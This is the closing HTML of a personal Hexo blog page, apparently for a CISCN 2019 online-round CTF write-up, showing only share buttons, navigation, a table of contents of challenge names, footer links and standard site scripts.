        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://www.damyahome.github.io/ctf-writeup/ckwd6025n006rkcucuim39ahz/&title=《第十二届全国大学生信息安全竞赛线上赛wp》 — Damya's Blog&source=在那远方的天空之下，一朵小花光鲜亮丽。" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      
    </ul>
 </div>



    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
        <i class="icon icon-share-alt icon-lg"></i>
    </a>
</div>

        </div>
        
            


        
    </div>
    
<nav class="post-nav flex-row flex-justify-between">
  
    <div class="prev">
      <a href="/ctf-writeup/ckwd6020v0007kcucxov4akjp/" id="post-prev" class="post-nav-link">
        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
        <h4 class="title">2019techworld wp</h4>
      </a>
    </div>
  

  
    <div class="next">
      <a href="/ctf-writeup-misc/ckwd60211000bkcucuh1u36fd/" id="post-next" class="post-nav-link">
        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
        <h4 class="title">2019安恒七月月赛 misc wp</h4>
      </a>
    </div>
  
</nav>


    
    
        <aside class="post-widget">
            <nav class="post-toc-wrap" id="post-toc">
                <strong>目录</strong>
                <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#防灾科技学院G1nkGioy战队"><span class="post-toc-number">1.</span> <span class="post-toc-text">防灾科技学院G1nkGioy战队</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#MISC"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">MISC</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#0x01-签到"><span class="post-toc-number">1.1.1.</span> <span class="post-toc-text">0x01  签到</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#0x02-saleae"><span class="post-toc-number">1.1.2.</span> <span class="post-toc-text">0x02  saleae</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#0x03-24c"><span class="post-toc-number">1.1.3.</span> <span class="post-toc-text">0x03  24c</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#0x04-usbasp"><span class="post-toc-number">1.1.4.</span> <span class="post-toc-text">0x04  usbasp</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#PWN"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">PWN</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#0x01-your-pwn"><span class="post-toc-number">1.2.1.</span> <span class="post-toc-text">0x01  your_pwn</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#0x02-baby-pwn"><span class="post-toc-number">1.2.2.</span> <span class="post-toc-text">0x02  baby_pwn</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#WEB"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">WEB</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#0x01-justsoso"><span class="post-toc-number">1.3.1.</span> <span class="post-toc-text">0x01  justsoso</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#0x02-全宇宙最简单的sql"><span class="post-toc-number">1.3.2.</span> <span class="post-toc-text">0x02  全宇宙最简单的sql</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#CRYPTO"><span class="post-toc-number">1.4.</span> <span class="post-toc-text">CRYPTO</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#0x01-puzzles"><span class="post-toc-number">1.4.1.</span> <span class="post-toc-text">0x01  puzzles</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#question0"><span class="post-toc-number">1.4.1.1.</span> <span class="post-toc-text">question0</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#question-1"><span class="post-toc-number">1.4.1.2.</span> <span class="post-toc-text">question 1</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#question2"><span class="post-toc-number">1.4.1.3.</span> <span class="post-toc-text">question2</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#question3"><span class="post-toc-number">1.4.1.4.</span> <span class="post-toc-text">question3</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#question4"><span class="post-toc-number">1.4.1.5.</span> <span class="post-toc-text">question4</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#0x02-SimpleDES"><span class="post-toc-number">1.4.2.</span> <span class="post-toc-text">0x02  SimpleDES</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#0x03-warmup"><span class="post-toc-number">1.4.3.</span> <span class="post-toc-text">0x03  warmup</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#0x04-Asymmetric"><span class="post-toc-number">1.4.4.</span> <span class="post-toc-text">0x04  Asymmetric</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#REVERSE"><span class="post-toc-number">1.5.</span> <span class="post-toc-text">REVERSE</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#0x01-easyGo"><span class="post-toc-number">1.5.1.</span> <span class="post-toc-text">0x01  easyGo</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#0x02-bbvvmm"><span class="post-toc-number">1.5.2.</span> <span class="post-toc-text">0x02  bbvvmm</span></a></li></ol></li></ol></li></ol>
            </nav>
            <div class="toc-bar"><div>
        </aside>
    
</article>

    <div id="reward" class="page-modal reward-lay">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <h3 class="reward-title">
        <i class="icon icon-quote-left"></i>
        让这个世界的bug有趣一点
        <i class="icon icon-quote-right"></i>
    </h3>
    <div class="reward-content">
        
        <div class="reward-code">
            <img id="rewardCode" src="/img/reward-wechat.jpg" alt="打赏二维码">
        </div>
        
        <label class="reward-toggle">
            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
                data-wechat="/img/reward-wechat.jpg" data-alipay="/img/reward-alipay.jpg">
            <div class="reward-toggle-ctrol">
                <span class="reward-toggle-item wechat">微信</span>
                <span class="reward-toggle-label"></span>
                <span class="reward-toggle-item alipay">支付宝</span>
            </div>
        </label>
        
    </div>
</div>

    

</div>

    </main>
    <footer class="footer ">
    
    <div class="top">
        
            <p>
    <span>Links：</span>
    
    <span class="blogroll-item">
        <a href="http://www.pdsdt.lovepdsdt.com/" target="_blank">Pdsdt</a>
    </span>
    
    <span class="blogroll-item">
        <a href="http://www.starssgo.top/" target="_blank">starssgo</a>
    </span>
    
    <span class="blogroll-item">
        <a href="http://phoebe233.cn/" target="_blank">W4nder</a>
    </span>
    
    <span class="blogroll-item">
        <a href="http://www.dongzt.cn/" target="_blank">Alkaid</a>
    </span>
    
    <span class="blogroll-item">
        <a href="https://whali3n51.top/" target="_blank">Whali3n51</a>
    </span>
    
    <span class="blogroll-item">
        <a href="http://www.ap1e.cn/" target="_blank">Aple</a>
    </span>
    
    <span class="blogroll-item">
        <a href="https://geeeez.github.io/" target="_blank">Geez</a>
    </span>
    
    <span class="blogroll-item">
        <a href="https://kkzevip.com/" target="_blank">MoR03r</a>
    </span>
    
    <span class="blogroll-item">
        <a href="https://www.virzz.com/" target="_blank">Virink</a>
    </span>
    
    <span class="blogroll-item">
        <a href="http://www.luoluopeach.top/" target="_blank">Luoluo</a>
    </span>
    
    <span class="blogroll-item">
        <a href="http://39.97.247.119/" target="_blank">Vigorous</a>
    </span>
    
    <span class="blogroll-item">
        <a href="http://www.constantine24.com/" target="_blank">Shanks</a>
    </span>
    
    <span class="blogroll-item">
        <a href="http://www.ysllz.com/" target="_blank">ysllz</a>
    </span>
    
</p>

        
    </div>
    
    <div class="bottom">
        <p>
            <span>
                Damya &copy; 2018 - 2021
            </span>
        		
           	
            
            
            <span>
	            Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/codefine/hexo-theme-mellow" target="_blank">mellow</a>
            </span>
            
            
            

            
                
<span class="site-uv" title="总访客量">
    <i class="icon icon-user"></i>
    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
</span>


<span class="site-pv" title="总访问量">
    <i class="icon icon-eye"></i>
    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>
</span>

            
        </p>
    </div>
</footer>

    <div class="mask" id="mask"></div>
<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>



<div class="global-share" id="globalShare">
    <ul class="reset share-icons">
      
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://www.damyahome.github.io/ctf-writeup/ckwd6025n006rkcucuim39ahz/&title=《第十二届全国大学生信息安全竞赛线上赛wp》 — Damya's Blog&pic=https://www.damyahome.github.io/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://www.damyahome.github.io/ctf-writeup/ckwd6025n006rkcucuim39ahz/&title=《第十二届全国大学生信息安全竞赛线上赛wp》 — Damya's Blog&source=在那远方的天空之下，一朵小花光鲜亮丽。" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      
    </ul>
 </div>


<div class="page-modal wx-share" id="wxShare">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <p>扫一扫，分享到微信</p>
    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACr0lEQVR42u3aQXLjQAgFUN3/0pkLRNIHmowWTyuX7Uj9OlUNBq4rvn5urlOf3r2++/TwhYeHh3do6b0lPi/0bonP90/ueXt/PDw8vDXe3SOrx/czKX8nuc/zmvHw8PC+xktgz+/n2/T8Gg8PD+/7vOd3nlPnBFwtW+Dh4eH9L9683FBNpqtJ83qtBQ8PDy/m5V2k77xe6e/h4eHhjbvq1SM7SbsnIwLl1eLh4eEt8PIDd5K8TtLfeYEDDw8P7ywvH7HqUaul2GoQerkzHh4e3gIvihtxOntqEGFSRL7KYREPDw+vxus9cl6kmAxjNcsQeHh4eId4+VLmpdsqu3rPa/JIPDw8vMFAQH7g5tvR27Jk+6L+Hh4eHt6f83qn7qkyRC8KFHYCDw8Pb8zrHdPVckOyTXlKfVvOwMPDw1vg5YfsvM2fD2PNQwIeHh7eHq83KDAJANVRg17Sj4eHh7fHS4oFvRS2ukGToYRClMPDw8M7xOsNB1SHsXoBpvd0PDw8vG3e5KBP0t/e0Z8XR14KwXh4eHhHeZMF5bB81KD6xJd74uHh4S3wqk2m5wM9J/X+tloiwcPDw9vmFXLwIOXtXXmpt1zSxcPDwzvEqxYFqj2makjobeLtHfDw8PAWeL2W0qk0OiclBYsoPODh4eGt8fKDOM/Z8yVOGmDNOgoeHh5ei1cdAqiWD/Lv9AYFXgIDHh4e3hqvWqToHe6jNv+8RoKHh4d3qOGU/7yffL/a0MrDzC//DDw8PLwF3tmmfl4NyEPFvG2Gh4eHt8HLD/ftnDYvfBQaaXh4eHhrvOqBPllKNbSM/hYPDw/vA7z5YEE1ge5tNx4eHt7XeNWkfCPYRCvEw8PDW+NNml69dDwZU6iGjdvAgIeHh3eUV/3BX92C6nhW0n5b6e/h4eHhvfP+AYJ22k8OYKhQAAAAAElFTkSuQmCC" alt="微信分享二维码">
</div>


    
    <!-- main-js -->
<script type="text/javascript" src="//cdn.bootcss.com/jquery/2.1.0/jquery.min.js"></script>
<script type="text/javascript" src="/js/plugins/fastclick.js?v=1.4.4"></script>
<script type="text/javascript" src="/js/plugins/ios-orientationchange-fix.js?v=1.4.4"></script>
<script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.js"></script>

<script type="text/javascript" src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>

<script type="text/javascript" src="/js/method.js?v=1.4.4"></script>
<script type="text/javascript" src="/js/blog.js?v=1.4.4"></script>

<!-- third-party -->






<script type="text/javascript" src="/js/plugins/local_search.js?v=1.4.4"></script>
<script type="text/javascript">
	var search_path = "search.xml";
	if (search_path.length === 0) {
		search_path = "search.xml";
	}
	var path = "/" + search_path;
	searchFunc(path, "local-search-input", "local-search-result");
</script>



<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>



    
    





    <!-- mathjax config similar to math.stackexchange -->
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
        tex2jax: {
            inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
            processEscapes: true,
            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
        }
    });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for (i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>

<script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>




    <script>
    (function() {
        var OriginTitile = document.title, titleTime;
        document.addEventListener('visibilitychange', function() {
            if (document.hidden) {
                document.title = '等你回来呀~';
                clearTimeout(titleTime);
            } else {
                document.title = '(つェ⊂)欢迎回来!';
                titleTime = setTimeout(function() {
                    document.title = OriginTitile;
                },2000);
            }
        });
    })();
</script>





    
<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/assets/tororo.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false});</script></body>
</html>
